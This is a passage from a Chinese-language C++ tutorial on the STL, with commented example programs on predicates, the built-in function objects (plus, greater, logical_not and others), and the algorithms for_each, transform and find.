<span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator it = <span class="built_in">find_if</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">GreaterFive</span>());</span><br><span class="line">	<span class="keyword">if</span> (it == v.<span class="built_in">end</span>()) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;没找到!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到:&quot;</span> &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：参数只有一个的谓词，称为一元谓词</p>
<h4 id="4-2-3-二元谓词"><a href="#4-2-3-二元谓词" class="headerlink" title="4.2.3 二元谓词"></a>4.2.3 二元谓词</h4><p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="comment">//二元谓词</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> num1 &gt; num2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//默认从小到大</span></span><br><span class="line">	<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;----------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用函数对象改变算法策略，排序从大到小</span></span><br><span class="line">	<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">MyCompare</span>());</span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：参数只有两个的谓词，称为二元谓词</p>
<h3 id="4-3-内建函数对象"><a href="#4-3-内建函数对象" class="headerlink" title="4.3 内建函数对象"></a>4.3 内建函数对象</h3><h4 id="4-3-1-内建函数对象意义"><a href="#4-3-1-内建函数对象意义" class="headerlink" title="4.3.1 内建函数对象意义"></a>4.3.1 内建函数对象意义</h4><p><strong>概念：</strong></p>
<ul>
<li>STL内建了一些函数对象</li>
</ul>
<p><strong>分类:</strong></p>
<ul>
<li><p>算术仿函数</p>
</li>
<li><p>关系仿函数</p>
</li>
<li><p>逻辑仿函数</p>
</li>
</ul>
<p><strong>用法：</strong></p>
<ul>
<li>这些仿函数所产生的对象，用法和一般函数完全相同</li>
<li>使用内建函数对象，需要引入头文件 <code>#include&lt;functional&gt;</code></li>
</ul>
<h4 id="4-3-2-算术仿函数"><a href="#4-3-2-算术仿函数" class="headerlink" title="4.3.2 算术仿函数"></a>4.3.2 算术仿函数</h4><p><strong>功能描述：</strong></p>
<ul>
<li>实现四则运算</li>
<li>其中negate是一元运算，其他都是二元运算</li>
</ul>
<p><strong>仿函数原型：</strong></p>
<ul>
<li><code>template&lt;class T&gt; T plus&lt;T&gt;</code>                &#x2F;&#x2F;加法仿函数</li>
<li><code>template&lt;class T&gt; T minus&lt;T&gt;</code>              &#x2F;&#x2F;减法仿函数</li>
<li><code>template&lt;class T&gt; T multiplies&lt;T&gt;</code>    &#x2F;&#x2F;乘法仿函数</li>
<li><code>template&lt;class T&gt; T divides&lt;T&gt;</code>         &#x2F;&#x2F;除法仿函数</li>
<li><code>template&lt;class T&gt; T modulus&lt;T&gt;</code>         &#x2F;&#x2F;取模仿函数</li>
<li><code>template&lt;class T&gt; T negate&lt;T&gt;</code>           &#x2F;&#x2F;取反仿函数</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="comment">//negate</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	negate&lt;<span class="type">int</span>&gt; n;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">n</span>(<span class="number">50</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//plus</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	plus&lt;<span class="type">int</span>&gt; p;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">p</span>(<span class="number">10</span>, <span class="number">20</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：使用内建函数对象时，需要引入头文件 <code>#include &lt;functional&gt;</code></p>
<h4 id="4-3-3-关系仿函数"><a href="#4-3-3-关系仿函数" class="headerlink" title="4.3.3 关系仿函数"></a>4.3.3 关系仿函数</h4><p><strong>功能描述：</strong></p>
<ul>
<li>实现关系对比</li>
</ul>
<p><strong>仿函数原型：</strong></p>
<ul>
<li><code>template&lt;class T&gt; bool equal_to&lt;T&gt;</code>                    &#x2F;&#x2F;等于</li>
<li><code>template&lt;class T&gt; bool not_equal_to&lt;T&gt;</code>            &#x2F;&#x2F;不等于</li>
<li><code>template&lt;class T&gt; bool greater&lt;T&gt;</code>                      &#x2F;&#x2F;大于</li>
<li><code>template&lt;class T&gt; bool greater_equal&lt;T&gt;</code>          &#x2F;&#x2F;大于等于</li>
<li><code>template&lt;class T&gt; bool less&lt;T&gt;</code>                           &#x2F;&#x2F;小于</li>
<li><code>template&lt;class T&gt; bool less_equal&lt;T&gt;</code>               &#x2F;&#x2F;小于等于</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1,<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v1 &gt; v2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">50</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//自己实现仿函数</span></span><br><span class="line">	<span class="comment">//sort(v.begin(), v.end(), MyCompare());</span></span><br><span class="line">	<span class="comment">//STL内建仿函数  大于仿函数</span></span><br><span class="line">	<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：关系仿函数中最常用的就是greater&lt;&gt;大于</p>
<h4 id="4-3-4-逻辑仿函数"><a href="#4-3-4-逻辑仿函数" class="headerlink" title="4.3.4 逻辑仿函数"></a>4.3.4 逻辑仿函数</h4><p><strong>功能描述：</strong></p>
<ul>
<li>实现逻辑运算</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>template&lt;class T&gt; bool logical_and&lt;T&gt;</code>              &#x2F;&#x2F;逻辑与</li>
<li><code>template&lt;class T&gt; bool logical_or&lt;T&gt;</code>                &#x2F;&#x2F;逻辑或</li>
<li><code>template&lt;class T&gt; bool logical_not&lt;T&gt;</code>              &#x2F;&#x2F;逻辑非</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">bool</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="literal">true</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="literal">false</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="literal">true</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">bool</span>&gt;::iterator it = v.<span class="built_in">begin</span>();it!= v.<span class="built_in">end</span>();it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//逻辑非  将v容器搬运到v2中，并执行逻辑非运算</span></span><br><span class="line">	vector&lt;<span class="type">bool</span>&gt; v2;</span><br><span class="line">	v<span class="number">2.</span><span class="built_in">resize</span>(v.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">transform</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(),  v<span class="number">2.</span><span class="built_in">begin</span>(), <span class="built_in">logical_not</span>&lt;<span class="type">bool</span>&gt;());</span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">bool</span>&gt;::iterator it = v<span class="number">2.</span><span class="built_in">begin</span>(); it != v<span class="number">2.</span><span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：逻辑仿函数实际应用较少，了解即可</p>
<h2 id="5-STL-常用算法"><a href="#5-STL-常用算法" class="headerlink" title="5 STL- 常用算法"></a>5 STL- 常用算法</h2><p><strong>概述</strong>:</p>
<ul>
<li><p>算法主要是由头文件<code>&lt;algorithm&gt;</code> <code>&lt;functional&gt;</code> <code>&lt;numeric&gt;</code>组成。</p>
</li>
<li><p><code>&lt;algorithm&gt;</code>是所有STL头文件中最大的一个，范围涉及到比较、 交换、查找、遍历操作、复制、修改等等</p>
</li>
<li><p><code>&lt;numeric&gt;</code>体积很小，只包括几个在序列上面进行简单数学运算的模板函数</p>
</li>
<li><p><code>&lt;functional&gt;</code>定义了一些模板类,用以声明函数对象。</p>
</li>
</ul>
<h3 id="5-1-常用遍历算法"><a href="#5-1-常用遍历算法" class="headerlink" title="5.1 常用遍历算法"></a>5.1 常用遍历算法</h3><p><strong>学习目标：</strong></p>
<ul>
<li>掌握常用的遍历算法</li>
</ul>
<p><strong>算法简介：</strong></p>
<ul>
<li><code>for_each</code>     &#x2F;&#x2F;遍历容器</li>
<li><code>transform</code>   &#x2F;&#x2F;搬运容器到另一个容器中</li>
</ul>
<h4 id="5-1-1-for-each"><a href="#5-1-1-for-each" class="headerlink" title="5.1.1 for_each"></a>5.1.1 for_each</h4><p><strong>功能描述：</strong></p>
<ul>
<li>实现遍历容器</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>for_each(iterator beg, iterator end, _func);  </code></p>
<p>&#x2F;&#x2F; 遍历算法 遍历容器元素</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; _func 函数或者函数对象</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//普通函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print01</span><span class="params">(<span class="type">int</span> val)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">print02</span> </span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for_each算法基本用法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//遍历算法</span></span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), print01);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">print02</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>for_each在实际开发中是最常用遍历算法，需要熟练掌握</p>
<h4 id="5-1-2-transform"><a href="#5-1-2-transform" class="headerlink" title="5.1.2 transform"></a>5.1.2 transform</h4><p><strong>功能描述：</strong></p>
<ul>
<li>搬运容器到另一个容器中</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>transform(iterator beg1, iterator end1, iterator beg2, _func);</code></li>
</ul>
<p>&#x2F;&#x2F;beg1 源容器开始迭代器</p>
<p>&#x2F;&#x2F;end1 源容器结束迭代器</p>
<p>&#x2F;&#x2F;beg2 目标容器开始迭代器</p>
<p>&#x2F;&#x2F;_func 函数或者函数对象</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//常用遍历算法  搬运 transform</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransForm</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> val;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;vTarget; <span class="comment">//目标容器</span></span><br><span class="line"></span><br><span class="line">	vTarget.<span class="built_in">resize</span>(v.<span class="built_in">size</span>()); <span class="comment">// 目标容器需要提前开辟空间</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">transform</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), vTarget.<span class="built_in">begin</span>(), <span class="built_in">TransForm</span>());</span><br><span class="line"></span><br><span class="line">	for_each(vTarget.<span class="built_in">begin</span>(), vTarget.<span class="built_in">end</span>(), <span class="built_in">MyPrint</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong> 搬运的目标容器必须要提前开辟空间，否则无法正常搬运</p>
<h3 id="5-2-常用查找算法"><a href="#5-2-常用查找算法" class="headerlink" title="5.2 常用查找算法"></a>5.2 常用查找算法</h3><p>学习目标：</p>
<ul>
<li>掌握常用的查找算法</li>
</ul>
<p><strong>算法简介：</strong></p>
<ul>
<li><code>find</code>                     &#x2F;&#x2F;查找元素</li>
<li><code>find_if</code>               &#x2F;&#x2F;按条件查找元素</li>
<li><code>adjacent_find</code>    &#x2F;&#x2F;查找相邻重复元素</li>
<li><code>binary_search</code>    &#x2F;&#x2F;二分查找法</li>
<li><code>count</code>                   &#x2F;&#x2F;统计元素个数</li>
<li><code>count_if</code>             &#x2F;&#x2F;按条件统计元素个数</li>
</ul>
<h4 id="5-2-1-find"><a href="#5-2-1-find" class="headerlink" title="5.2.1 find"></a>5.2.1 find</h4><p><strong>功能描述：</strong></p>
<ul>
<li>查找指定元素，找到返回指定元素的迭代器，找不到返回结束迭代器end()</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>find(iterator beg, iterator end, value);  </code></p>
<p>&#x2F;&#x2F; 按值查找元素，找到返回指定位置迭代器，找不到返回结束迭代器位置</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; value 查找的元素</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//查找容器中是否有 5 这个元素</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator it = <span class="built_in">find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="number">5</span>);</span><br><span class="line">	<span class="keyword">if</span> (it == v.<span class="built_in">end</span>()) </span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;没有找到!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到:&quot;</span> &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//重载==</span></span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Person&amp; p) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="keyword">this</span>-&gt;m_Age == p.m_Age) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;Person&gt; v;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建数据</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;aaa&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;bbb&quot;</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;ccc&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;ddd&quot;</span>, <span class="number">40</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">push_back</span>(p1);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p2);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p3);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p4);</span><br><span class="line"></span><br><span class="line">	vector&lt;Person&gt;::iterator it = <span class="built_in">find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), p2);</span><br><span class="line">	<span class="keyword">if</span> (it == v.<span class="built_in">end</span>()) </span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;没有找到!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span 